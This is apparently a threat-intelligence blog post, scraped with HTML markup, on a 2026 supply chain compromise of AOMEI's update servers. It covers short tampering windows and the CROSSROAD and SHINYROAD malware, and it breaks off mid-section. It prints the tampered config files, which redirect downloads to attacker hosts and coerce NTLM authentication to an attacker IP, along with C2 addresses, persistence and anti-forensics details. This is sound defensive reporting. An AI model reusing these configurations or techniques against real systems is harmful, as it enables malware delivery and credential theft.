class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re"></div><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-II5mzb kWSSdd"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"><div class="aLW4J" track-metadata-module="left rail"><h5 class="qZDXV Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-wNfPc">Google Threat Intelligence</h5><p class="nRhiJb-cHYyed Mrfygc nRhiJb-BP2Omd-ma6Yeb-KE6vqe nRhiJb-DbgRPb-R6PoUb-cGMI2b">Visibility and context on the threats that matter most.</p><a class="nRhiJb-LgbsSe  nRhiJb-LgbsSe-OWXEXe-CNusmb-o6Shpd " href="https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest" Us &amp; Get a Demo </a></div></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">Written by: <span style="vertical-align:baseline">Tyler McLellan<br></span></span></p>
<hr>
<h3><span style="vertical-align:baseline">Introduction</span></h3>
<p><span style="vertical-align:baseline">Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning.  </span></p>
<p><span style="vertical-align:baseline">The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017. </span></p>
<p><span style="vertical-align:baseline">Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified. </span></p>
<p><span style="vertical-align:baseline">This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. <span style="vertical-align:baseline">METAL’s analysis of this campaign is </span><span style="vertical-align:baseline">available</span><span style="vertical-align:baseline"> in their </span><a href="https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">blog</span></a><span style="vertical-align:baseline">.</span></span></p>
<h3><span style="vertical-align:baseline">How AOMEI Update and Notification Systems Work</span></h3>
<p><span style="vertical-align:baseline">AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services (</span><code style="vertical-align:baseline">Backupper.exe</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">ABNotify.exe</code><span style="vertical-align:baseline">) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups:</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_AOMEI_Update_Mechanism.max-2000x2000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 1: AOMEI Update Mechanism</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Update Configuration</strong><span style="vertical-align:baseline"> (</span><code style="vertical-align:baseline">down_html.ini</code><span style="vertical-align:baseline">): The software periodically sends an HTTPS request to </span><code style="vertical-align:baseline">https://www2.aomeisoftware.com/download/abpopup/down_html.ini</code><span style="vertical-align:baseline">. This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download </span><code style="vertical-align:baseline">upgrade-now.zip</code><span style="vertical-align:baseline">.</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><span style="vertical-align:baseline">Notification Configuration (</span><code style="vertical-align:baseline">Notifycfg.ini</code><span style="vertical-align:baseline">): The software contacts </span><code style="vertical-align:baseline">https://account.aomeitech.com/Notifycfg.ini</code><span style="vertical-align:baseline">. This file instructs the local notification process (</span><code style="vertical-align:baseline">ABNotify.exe</code><span style="vertical-align:baseline">) what messages to display and specifies commands or programs located in the software’s local directory to execute.</span></p>
</li>
</ol>
<p><span style="vertical-align:baseline">Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain (</span><code style="vertical-align:baseline">www2.aomeisoftware.com</code><span style="vertical-align:baseline">).</span></p>
<h3><span style="vertical-align:baseline">Campaign Overview</span></h3>
<p><span style="vertical-align:baseline">Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files. </span></p>
<p><span style="vertical-align:baseline">During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware. </span></p>
<p><span style="vertical-align:baseline">In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control.</span></p>
<h4><span style="vertical-align:baseline">Short Burst Supply Chain Tampering</span></h4>
<p><span style="vertical-align:baseline">A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">May 28: 10-minute exposure window (05:40 – 05:50 UTC)</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">July 16: 6-minute exposure window (08:33 – 08:39 UTC)</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">July 20: 5-minute exposure window (10:35 – 10:40 UTC)</span></p>
</li>
</ul>
<p><span style="vertical-align:baseline">At the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes.</span></p>
<h4><span style="vertical-align:baseline">Weaponizing Native Update Logic: down_html.ini and Configuration Bloat</span></h4>
<p><span style="vertical-align:baseline">To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini.</span></p>
<p><span style="vertical-align:baseline">To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window:</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>[Date]
-Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip
+Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
-thrid=5
+thrid=6
[MD5]
-Val=EE89C99F3753231771170F5D9CBBAE1E
+Val=31323E7E738230FA6A8DEEF2B7894666</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash.</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory.</span></p>
<h4><span style="vertical-align:baseline">Infrastructure Shifts</span></h4>
<p><span style="vertical-align:baseline">Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic. </span></p>
<h4><span style="font-style:italic;vertical-align:baseline">Infrastructure Shifts</span></h4>
<ol>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Early Cloud Staging (April–May 2026):</strong><span style="vertical-align:baseline"> Early CROSSROAD payloads (</span><code style="vertical-align:baseline">upgrade-now.exe</code><span style="vertical-align:baseline"> observed May 20) relied on Alibaba Cloud Object Storage (</span><code style="vertical-align:baseline">serv.oss-cn-hongkong.aliyuncs.com</code><span style="vertical-align:baseline">).</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Dedicated Domain Infrastructure (July 1–7, 2026):</strong><span style="vertical-align:baseline"> The threat actor transitioned to dedicated, vendor-themed domains (</span><code style="vertical-align:baseline">storage-data.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">promotion.storage-data.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">aomei.storage-data.com</code><span style="vertical-align:baseline">).</span></p>
</li>
<li style="list-style-type:decimal;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Hybrid Cloud Delivery Split (July 20, 2026):</strong><span style="vertical-align:baseline"> During the 5-minute window on July 20, the threat actor modified </span><code style="vertical-align:baseline">down_html.ini</code><span style="vertical-align:baseline"> to direct initial client downloads to a public Google Cloud Storage bucket (</span><code style="vertical-align:baseline">storage.googleapis.com/aomeiupdate/upgrade-now.zip</code><span style="vertical-align:baseline">) rather than </span><code style="vertical-align:baseline">storage-data.com</code><span style="vertical-align:baseline">. This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage </span><code style="vertical-align:baseline">storage-data.com</code><span style="vertical-align:baseline"> for secondary payload retrieval and C2 communications.</span></p>
</li>
</ol></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>[Date]
Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip
Name=upgrade-now
[Version]
maj=8
min=2
thrid=7
[MD5]
Val=BF73C4391B58CA95220CE3AE03F66DCF</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 3: July 20 modification of down_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks.</span></span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h3><span style="vertical-align:baseline">WebDAV NTLM Credential Coercion</span></h3>
<p><span style="vertical-align:baseline">On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path:</span></p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><pre><code>[PopWindow1]
ID=307
Title=20260408-AB Flash Sale (All Lang 不含EN)
Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
</code></pre>
<p style="text-align:center"><span style="color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%"><span style="vertical-align:baseline">Figure 4: Malicious </span><code style="vertical-align:baseline">Notifycfg.ini</code><span style="vertical-align:baseline"> configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to </span><code style="vertical-align:baseline">8.210.84.56</code><span style="vertical-align:baseline">.</span></span></p>
<p> </p></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p><span style="vertical-align:baseline">By forcing the AOMEI client to request a remote </span><code style="vertical-align:baseline">file://</code><span style="vertical-align:baseline"> resource via WebDAV (</span><code style="vertical-align:baseline">DavWWWRoot</code><span style="vertical-align:baseline">), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address (</span><code style="vertical-align:baseline">8.210.84.56</code><span style="vertical-align:baseline">) without user visibility.</span></p>
<h4><span style="vertical-align:baseline">Malware Delivery &amp; Post-Exploitation Tooling</span></h4>
<p><span style="vertical-align:baseline">Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Defense Evasion via Timestomping: </strong><span style="vertical-align:baseline">Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Modified Radmin Server Backdoor: </strong><span style="vertical-align:baseline">During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Adaptix C2 Integration:</strong><span style="vertical-align:baseline"> Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure.</span></p>
</li>
</ul>
<h4><span style="font-style:italic;vertical-align:baseline">The Primary Downloader: CROSSROAD </span></h4>
<p><span style="vertical-align:baseline">The primary Stage-2 downloader (</span><code style="vertical-align:baseline">upgrade-now.exe</code><span style="vertical-align:baseline">, SHA256: </span><code style="vertical-align:baseline">9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450</code><span style="vertical-align:baseline">) is a 64-bit Windows executable written in C, tracked by GTIG as the </span><strong style="vertical-align:baseline">CROSSROAD</strong><span style="vertical-align:baseline"> malware family. Delivered inside </span><code style="vertical-align:baseline">upgrade-now.zip</code><span style="vertical-align:baseline">, CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Path Verification:</strong><span style="vertical-align:baseline"> As part of its configuration routine, CROSSROAD checks whether its file path contains the substring </span><code style="vertical-align:baseline">AOMEI</code><span style="vertical-align:baseline">. If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Execution Guardrails:</strong><span style="vertical-align:baseline"> Before proceeding with secondary downloads, CROSSROAD enforces two primary checks:</span></p>
</li>
<ul>
<li style="list-style-type:circle;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Geolocation Check:</strong><span style="vertical-align:baseline"> Queries external domain name system (DNS) (</span><code style="vertical-align:baseline">myip.opendns.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">o-o.myaddr.l.google.com</code><span style="vertical-align:baseline">) and HTTP reflection services (</span><code style="vertical-align:baseline">checkip.amazonaws.com</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">api.ipify.org</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">ifconfig.me/ip</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">icanhazip.com</code><span style="vertical-align:baseline">) using custom User-Agents (</span><code style="vertical-align:baseline">Anyviewer-loader/1.0</code><span style="vertical-align:baseline">, </span><code style="vertical-align:baseline">Anyviewer-ipcheck/1.0</code><span style="vertical-align:baseline">). In specific execution branches, if the returned country code is </span><code style="vertical-align:baseline">"CN"</code><span style="vertical-align:baseline"> (China), the loader aborts its primary payload execution path.</span></p>
</li>
<li style="list-style-type:circle;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Lock Mutex:</strong><span style="vertical-align:baseline"> Acquires the named mutex </span><code style="vertical-align:baseline">Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}</code><span style="vertical-align:baseline"> to prevent multiple concurrent instances on the same host.</span></p>
</li>
</ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Host Artifact Reversion &amp; Anti-Forensics: </strong><span style="vertical-align:baseline">To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses </span><code style="vertical-align:baseline">down_html.ini</code><span style="vertical-align:baseline"> (located at </span><code style="vertical-align:baseline">&lt;install_dir&gt;\..\..\</code><span style="vertical-align:baseline">), restoring the update thread parameter (</span><code style="vertical-align:baseline">thrid</code><span style="vertical-align:baseline">) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure (</span><code style="vertical-align:baseline">https://www2.aomeisoftware.com/download/abpopup/</code><span style="vertical-align:baseline">).</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><span style="vertical-align:baseline">Stage-3 Payload Staging &amp; Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc&lt;random_hex&gt;.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Persistence via Scheduled Task:</strong><span style="vertical-align:baseline"> To ensure continuous execution of the staged payload bundle, </span><code style="vertical-align:baseline">upgrade-now.exe</code><span style="vertical-align:baseline"> registers a persistent scheduled task named </span><code style="vertical-align:baseline">RadminComponentRuntime</code><span style="vertical-align:baseline"> (configured with the description”Radmin Component runtime checkable.”). The task is set to execute </span><code style="vertical-align:baseline">%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk</code><span style="vertical-align:baseline"> every three hours.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Self-Deletion (</strong><strong style="vertical-align:baseline">--nitrod</strong><strong style="vertical-align:baseline">):</strong><span style="vertical-align:baseline"> After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the </span><code style="vertical-align:baseline">--nitrod</code><span style="vertical-align:baseline"> parameter, passing its parent PID via </span><code style="vertical-align:baseline">NITRODP</code><span style="vertical-align:baseline"> and original executable path via </span><code style="vertical-align:baseline">NITRODT</code><span style="vertical-align:baseline">. The child process waits for the parent to terminate, renames the original binary's primary </span><code style="vertical-align:baseline">:$DATA</code><span style="vertical-align:baseline"> stream to an alternate data stream named </span><code style="vertical-align:baseline">:wtfbbq</code><span style="vertical-align:baseline"> via </span><code style="vertical-align:baseline">SetFileInformationByHandle</code><span style="vertical-align:baseline">, and flags </span><code style="vertical-align:baseline">FileDispositionInfo</code><span style="vertical-align:baseline"> with </span><code style="vertical-align:baseline">DeleteFile = TRUE</code><span style="vertical-align:baseline"> to unlink the binary on handle close.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Version Information:</strong><span style="vertical-align:baseline"> The executable contained standard PE version metadata with a notable typo string: </span><code style="vertical-align:baseline">"ProductName: AOMEI Update Compent"</code><span style="vertical-align:baseline">.</span></p>
</li>
</ul></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_5_Victim_Profiling_Malware_Delivery.max-2000x2000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_5_Victim_Profiling_Malware_Delivery.max-2000x2000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_5_Victim_Profiling_Malware_Delivery.max-2000x2000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_5_Victim_Profiling_Malware_Delivery.max-2000x2000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><p>Figure 5: Victim Profiling, Malware Delivery Logic</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" data-is-cws-richtext="true" class=" "><h4><span style="font-style:italic;vertical-align:baseline">Stage-3 Payload: SHINYROAD and Radmin Suite</span></h4>
<p><span style="vertical-align:baseline">The payload archive unpacked into </span><code style="vertical-align:baseline">%LOCALAPPDATA%\Radmin\</code><span style="vertical-align:baseline"> by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the </span><strong style="vertical-align:baseline">SHINYROAD</strong><span style="vertical-align:baseline"> modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution.</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Execution via DLL Search-Order Hijacking (</strong><strong style="vertical-align:baseline">BlkScrDl.dll</strong><strong style="vertical-align:baseline">):</strong><span style="vertical-align:baseline"> Execution begins when the persistent </span><code style="vertical-align:baseline">RadminComponentRuntime</code><span style="vertical-align:baseline"> scheduled task launches the legitimate, signed Radmin binary </span><code style="vertical-align:baseline">%LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk</code><span style="vertical-align:baseline"> (or </span><code style="vertical-align:baseline">FamItrf2.exe</code><span style="vertical-align:baseline">). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, </span><code style="vertical-align:baseline">BlkScrDl.dll</code><span style="vertical-align:baseline">, via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Shared Memory &amp; In-Process COM Server Staging:</strong><span style="vertical-align:baseline"> Upon execution, </span><code style="vertical-align:baseline">BlkScrDl.dll</code><span style="vertical-align:baseline"> locates </span><code style="vertical-align:baseline">config.zip</code><span style="vertical-align:baseline"> in its execution directory, maps its raw contents into a shared memory section named </span><code style="vertical-align:baseline">Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf</code><span style="vertical-align:baseline">, and dynamically registers </span><code style="vertical-align:baseline">csvc\RuntimeComponent.dll</code><span style="vertical-align:baseline"> as an in-process COM Server under CLSID </span><code style="vertical-align:baseline">{21191641-0D7F-4CD9-9572-01AAE6E7851B}</code><span style="vertical-align:baseline"> and AppID </span><code style="vertical-align:baseline">{9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}</code><span style="vertical-align:baseline">.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">COM-Triggered Stage-2 Initialization &amp; Embedded PocketPy VM:</strong><span style="vertical-align:baseline"> When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads </span><code style="vertical-align:baseline">config.zip</code><span style="vertical-align:baseline"> directly from shared memory, extracts the encrypted payload </span><code style="vertical-align:baseline">metadata.dat</code><span style="vertical-align:baseline">, and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which </span><code style="vertical-align:baseline">RuntimeComponent.dll</code><span style="vertical-align:baseline"> executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to </span><code style="vertical-align:baseline">8.218.65.184:443</code><span style="vertical-align:baseline">.</span></p>
</li>
</ul>
<h4><span style="vertical-align:baseline">Evolution of the SHINYROAD Architecture</span></h4>
<p><span style="vertical-align:baseline">Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk:</span></p>
<ul>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">Custom Binary C2 Protocol</strong><span style="vertical-align:baseline">: Earlier variants communicated over raw TCP (</span><code style="vertical-align:baseline">8.218.65.184:41397</code><span style="vertical-align:baseline">). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID.</span></p>
</li>
<li style="list-style-type:disc;vertical-align:baseline">
<p><strong style="vertical-align:baseline">In-Memory Capabilities</strong><span style="vertical-align:baseline">: The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the </span><code style="vertical-align:baseline">pkpy</code><span style="vertical-align:baseline"> WorkPool thread manager without writing script modules to disk.</span></p>
</li>
</ul>
<h4><span style="font-style:italic;vertical-align:baseline">Post-Exploitation: Nitro PDF Theme &amp; Adaptix C2</span></h4>
